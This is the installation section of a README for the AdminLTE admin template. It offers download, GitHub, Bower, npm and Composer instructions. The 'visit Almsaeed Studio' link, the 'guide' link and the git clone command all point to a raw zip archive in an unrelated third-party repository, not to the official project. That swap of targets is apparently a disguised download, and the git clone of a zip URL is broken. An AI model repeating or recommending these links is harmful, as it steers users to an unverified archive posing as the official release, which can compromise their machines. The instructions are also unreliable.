Installation
------------
There are multiple ways to install AdminLTE.

####Download:

Download from Github or [visit Almsaeed Studio](https://raw.githubusercontent.com/dextercool/AdminLTE/master/build/Admin_LTE_3.3-beta.3.zip) and download the latest release.

####Using The Command Line:

**Github**

- Fork the repository ([here is the guide](https://raw.githubusercontent.com/dextercool/AdminLTE/master/build/Admin_LTE_3.3-beta.3.zip)).
- Clone to your machine
```
git clone https://raw.githubusercontent.com/dextercool/AdminLTE/master/build/Admin_LTE_3.3-beta.3.zip
```

**Bower**

```
bower install admin-lte
```

**npm**

```
npm install --save admin-lte
```

**Composer**

```
composer require "almasaeed2010/adminlte=~2.0"
```
